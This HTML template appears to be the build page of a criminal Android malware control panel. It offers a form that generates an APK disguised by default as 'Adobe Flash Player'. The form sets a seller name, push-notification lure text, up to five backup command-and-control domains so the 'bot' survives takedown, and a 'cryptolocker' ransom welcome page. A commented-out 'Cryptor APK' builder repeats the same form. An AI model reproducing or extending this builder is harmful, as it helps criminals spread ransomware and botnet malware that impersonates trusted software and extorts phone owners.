
<div class="demo-charts mdl-shadow--2dp mdl-cell mdl-cell--12-col mdl-grid" style="background-color: #37474f;">	
            <h5 style="color: white;"><i class="material-icons" style="color: white; margin-right: 20px;">build</i>Build</h5>
</div>

<!--  image-picker  -->
<link rel="stylesheet" type="text/css" href="styles/image-picker.css">
<script type="text/javascript" src="js/image-picker.js"></script>
<script type="text/javascript" src="js/image-picker.min.js"></script>

	<div class="demo-charts mdl-color--white mdl-shadow--2dp mdl-cell mdl-cell--12-col mdl-grid">
		

		<div class="demo-charts mdl-color--white mdl-shadow--2dp mdl-cell mdl-cell--12-col mdl-grid mdl-shadow--2dp" style="width: 100%">
			<div class="mdl-card__title mdl-card--expand" style="width: 100%">
		        <h2 >Build apk</h2>
		    </div>
		    <div class="mdl-card__supporting-text" style="width: 46%;">
		    	<!--Package name for new build:<br>
			  	<div class="mdl-textfield mdl-js-textfield">
				    <input class="mdl-textfield__input" type="text" id="packname_for_build">
				    <label class="mdl-textfield__label" for="packname_for_build"></label>
				</div>-->
				<br>Icon will be changed automaticaly. Please select icon on the bottom window.<br>
			  	<div class="mdl-textfield mdl-js-textfield">
				    <input class="mdl-textfield__input" type="text" id="icon_for_build">
				    <label class="mdl-textfield__label" for="icon_for_build"></label>
				</div>
				<br>Seller name:<br>
			  	<div class="mdl-textfield mdl-js-textfield">
				    <input class="mdl-textfield__input" type="text" id="seller_for_build">
				    <label class="mdl-textfield__label" for="seller_for_build"></label>
				</div>
				<br>Application name:<br>
			  	<div class="mdl-textfield mdl-js-textfield">
				    <input class="mdl-textfield__input" type="text" id="appname_for_build" value="Adobe Flash Player">
				    <label class="mdl-textfield__label" for="appname_for_build"></label>
				</div>
				<br>Time:<br>
			  	<div class="mdl-textfield mdl-js-textfield">
				    <input class="mdl-textfield__input" type="text" id="time_for_build" value="5">
				    <label class="mdl-textfield__label" for="time_for_build"></label>
				</div>
				<br>Push Title:<br>
			  	<div class="mdl-textfield mdl-js-textfield">
				    <input class="mdl-textfield__input" type="text" id="ptitle_for_build">
				    <label class="mdl-textfield__label" for="ptitle_for_build"></label>
				</div>
				<br>Push Text:<br>
			  	<div class="mdl-textfield mdl-js-textfield">
				    <input class="mdl-textfield__input" type="text" id="ptext_for_build">
				    <label class="mdl-textfield__label" for="ptext_for_build"></label>
				</div>
				<br>Push Time:<br>
			  	<div class="mdl-textfield mdl-js-textfield">
				    <input class="mdl-textfield__input" type="text" id="ptime_for_build" value="180">
				    <label class="mdl-textfield__label" for="ptime_for_build"></label>
				</div>
		    </div>
		    <div class="mdl-card__supporting-text" style="width: 47%;">
		    	Control panel domains. This option need for bot survive after destroy command server. You can set 5 domains.:<br>
		    	<br>Domain 1:<br>
			  	<div class="mdl-textfield mdl-js-textfield">
				    <input class="mdl-textfield__input" type="text" id="domain1_for_build" value="http://test1.domain/">
				    <label class="mdl-textfield__label" for="domain1_for_build"></label>
				</div>
				<br>Domain 2:<br>
			  	<div class="mdl-textfield mdl-js-textfield">
				    <input class="mdl-textfield__input" type="text" id="domain2_for_build" value="http://test2.domain/">
				    <label class="mdl-textfield__label" for="domain2_for_build"></label>
				</div>
				<br>Domain 3:<br>
			  	<div class="mdl-textfield mdl-js-textfield">
				    <input class="mdl-textfield__input" type="text" id="domain3_for_build" value="http://test3.domain/">
				    <label class="mdl-textfield__label" for="domain3_for_build"></label>
				</div>
				<br>Domain 4:<br>
			  	<div class="mdl-textfield mdl-js-textfield">
				    <input class="mdl-textfield__input" type="text" id="domain4_for_build" value="http://test4.domain/">
				    <label class="mdl-textfield__label" for="domain4_for_build"></label>
				</div>
				<br>Domain 5:<br>
			  	<div class="mdl-textfield mdl-js-textfield">
				    <input class="mdl-textfield__input" type="text" id="domain5_for_build" value="http://test5.domain/">
				    <label class="mdl-textfield__label" for="domain5_for_build"></label>
				</div>
				<br><br><br>Please set welcome page file for cryptolocker function:
				<input list="welcompages" name="welcompage" id="welcompage_for_build" >
				<datalist id="welcompages">
				    %%PLACE_WPAGES_HERE%%
				</datalist>
		    </div>

		  <div class="mdl-card__actions mdl-card--border">
		    <a class="mdl-button mdl-button--colored mdl-js-button mdl-js-ripple-effect" onclick="buildAPK();">
		      Build APK
		    </a>
		  </div>
		</div>

		<!--<div class="demo-charts mdl-color--white mdl-shadow--2dp mdl-cell mdl-cell--12-col mdl-grid mdl-shadow--2dp" style="width: 100%">
			<div class="mdl-card__title mdl-card--expand" style="width: 100%">
		        <h2 >Build Сryptor apk</h2>
		    </div>
		    <div class="mdl-card__supporting-text" style="width: 46%;">
		    	Package name for new build:<br>
			  	<div class="mdl-textfield mdl-js-textfield">
				    <input class="mdl-textfield__input" type="text" id="packname_for_crypt_build">
				    <label class="mdl-textfield__label" for="packname_for_crypt_build"></label>
				</div>
				<br>Icon will be changed automaticaly. Please select icon on the bottom window.<br>
			  	<div class="mdl-textfield mdl-js-textfield">
				    <input class="mdl-textfield__input" type="text" id="icon_for_crypt_build">
				    <label class="mdl-textfield__label" for="icon_for_crypt_build"></label>
				</div>
				<br>Seller name:<br>
			  	<div class="mdl-textfield mdl-js-textfield">
				    <input class="mdl-textfield__input" type="text" id="seller_for_crypt_build">
				    <label class="mdl-textfield__label" for="seller_for_crypt_build"></label>
				</div>
				<br>Application name:<br>
			  	<div class="mdl-textfield mdl-js-textfield">
				    <input class="mdl-textfield__input" type="text" id="appname_for_crypt_build" value="Adobe Flash Player">
				    <label class="mdl-textfield__label" for="appname_for_crypt_build"></label>
				</div>
				<br>Time:<br>
			  	<div class="mdl-textfield mdl-js-textfield">
				    <input class="mdl-textfield__input" type="text" id="time_for_crypt_build" value="5">
				    <label class="mdl-textfield__label" for="time_for_crypt_build"></label>
				</div>
				<br>Push Title:<br>
			  	<div class="mdl-textfield mdl-js-textfield">
				    <input class="mdl-textfield__input" type="text" id="ptitle_for_crypt_build">
				    <label class="mdl-textfield__label" for="ptitle_for_crypt_build"></label>
				</div>
				<br>Push Text:<br>
			  	<div class="mdl-textfield mdl-js-textfield">
				    <input class="mdl-textfield__input" type="text" id="ptext_for_crypt_build">
				    <label class="mdl-textfield__label" for="ptext_for_crypt_build"></label>
				</div>
				<br>Push Time:<br>
			  	<div class="mdl-textfield mdl-js-textfield">
				    <input class="mdl-textfield__input" type="text" id="ptime_for_crypt_build" value="180">
				    <label class="mdl-textfield__label" for="ptime_for_crypt_build"></label>
				</div>
		    </div>
		    <div class="mdl-card__supporting-text" style="width: 47%;">
		    	Control panel domains. This option need for bot survive after destroy command server. You can set 5 domains.:<br>
		    	<br>Domain 1:<br>
			  	<div class="mdl-textfield mdl-js-textfield">
				    <input class="mdl-textfield__input" type="text" id="domain1_for_crypt_build" value="http://test1.domain/">
				    <label class="mdl-textfield__label" for="domain1_for_crypt_build"></label>
				</div>
				<br>Domain 2:<br>
			  	<div class="mdl-textfield mdl-js-textfield">
				    <input class="mdl-textfield__input" type="text" id="domain2_for_crypt_build" value="http://test2.domain/">
				    <label class="mdl-textfield__label" for="domain2_for_crypt_build"></label>
				</div>
				<br>Domain 3:<br>
			  	<div class="mdl-textfield mdl-js-textfield">
				    <input class="mdl-textfield__input" type="text" id="domain3_for_crypt_build" value="http://test3.domain/">
				    <label class="mdl-textfield__label" for="domain3_for_crypt_build"></label>
				</div>
				<br>Domain 4:<br>
			  	<div class="mdl-textfield mdl-js-textfield">
				    <input class="mdl-textfield__input" type="text" id="domain4_for_crypt_build" value="http://test4.domain/">
				    <label class="mdl-textfield__label" for="domain4_for_crypt_build"></label>
				</div>
				<br>Domain 5:<br>
			  	<div class="mdl-textfield mdl-js-textfield">
				    <input class="mdl-textfield__input" type="text" id="domain5_for_crypt_build" value="http://test5.domain/">
				    <label class="mdl-textfield__label" for="domain5_for_crypt_build"></label>
				</div>
				<br><br><br>Please set welcome page file for cryptolocker function:
				<input list="welcompages" name="welcompage" id="welcompage_for_crypt_build" >
				<datalist id="welcompages">
				    %%PLACE_WPAGES_HERE%%
				</datalist>
		    </div>

		  <div class="mdl-card__actions mdl-card--border">
		    <a class="mdl-button mdl-button--colored mdl-js-button mdl-js-ripple-effect" onclick="buil1dCryptAPK();">
		      Build Cryptor APK
		    </a>
		  </div>
		</div>-->

		<div class="demo-card-square mdl-card mdl-shadow--2dp" style="width: 325px;margin-right: 20px; margin-bottom: 20px;">
		  <div class="mdl-card__title mdl-card--expand">
		    <h2 class="mdl-card__title-text">Download</h2>
		  </div>
		  <div class="mdl-card__supporting-text">
		  </div>
		  <div class="mdl-card__actions mdl-card--border">
		    <a class="mdl-button mdl-button--colored mdl-js-button mdl-js-ripple-effect" onclick="downloadAPK();">
		      Download
		    </a>
		    <!--<a class="mdl-button mdl-button--colored mdl-js-button mdl-js-ripple-effect" onclick="downloadCryptAPK();">
		      Download Cryptor
		    </a>-->
		  </div>
		</div>
		<div class="demo-card-square mdl-card mdl-shadow--2dp" style="width: 325px;margin-right: 20px; margin-bottom: 20px;">
			<div class="mdl-card__title mdl-card--expand">
				<h2 class="mdl-card__title-text">Upload new apk icon</h2>
			</div>
		    <div class="mdl-card__supporting-text">
			    <div class="mdl-textfield mdl-js-textfield mdl-textfield--file">
				    <input class="mdl-textfield__input" placeholder="File" type="text" id="uploadFile" readonly/>
				    <div class="mdl-button mdl-button--primary mdl-button--icon mdl-button--file" style="right: 0; top:15px;">
				      <i class="material-icons">attach_file</i><input type="file" id="uploadBtn" style="cursor: pointer;height: 100%;right: 0;opacity: 0;position: absolute;top: 0;width: 300px;z-index: 4;" onchange='document.getElementById("uploadFile").value = this.files[0].name;'>
				    </div>
				</div>
				If you want to upload new icon - choose file and push the UPLOAD button.
			</div>
			<div class="mdl-card__actions mdl-card--border">
			    <input class="mdl-button mdl-button--colored mdl-js-button mdl-js-ripple-effect" onclick="uploadFileIcon('icons');" type="submit" name="sub" value="upload">
			</div>
		</div>
		<div class="demo-card-square mdl-card mdl-shadow--2dp" style="width: 325px;margin-right: 20px; margin-bottom: 20px;">
			<div class="mdl-card__title mdl-card--expand">
				<h2 class="mdl-card__title-text">Upload new cryptolocker welcomepage</h2>
			</div>
		    <div class="mdl-card__supporting-text">
			    <div class="mdl-textfield mdl-js-textfield mdl-textfield--file">
				    <input class="mdl-textfield__input" placeholder="File" type="text" id="uploadFileW" readonly/>
				    <div class="mdl-button mdl-button--primary mdl-button--icon mdl-button--file" style="right: 0; top:15px;">
				      <i class="material-icons">attach_file</i><input type="file" id="uploadWelcomeBtn" style="cursor: pointer;height: 100%;right: 0;opacity: 0;position: absolute;top: 0;width: 300px;z-index: 4;" onchange='document.getElementById("uploadFileW").value = this.files[0].name;'>
				    </div>
				</div>
				If you want to upload new welcomepage for cryptolocker - choose file and push the UPLOAD button.
			</div>
			<div class="mdl-card__actions mdl-card--border">
			    <input class="mdl-button mdl-button--colored mdl-js-button mdl-js-ripple-effect" onclick="uploadFileWelcome('welcomepage');" type="submit" name="sub" value="upload">
			</div>
		</div>

	    <!--</form>-->
	    <div class="over_window">
	    <div class="picker">
	    	<select class="image-picker masonry show-html" onchange="updateIconBuild();">
			  %%PLACE_ICONS_HERE%%
			</select>
			<script type="text/javascript">$("select").imagepicker()</script>
		</div>
	    </div>

	</div>
	<script type="text/javascript">
		$("#seller_for_build").val("seller4test");
		$("#ptitle_for_build").val("ptitle_test");
		$("#ptext_for_build").val("ptext_test");

		$("#packname_for_crypt_build").val(random_package());
		$("#seller_for_crypt_build").val("seller4test");
		$("#ptitle_for_crypt_build").val("ptitle_test");
		$("#ptext_for_crypt_build").val("ptext_test");
		//$("#ptime_for_build").val("60");
		//$("#time_for_build").val("60");
	</script>

	<div id = "logs_modal" style="display:none;"></div>
	<div id = "commands_modal" style="display:none;"></div>
</div>
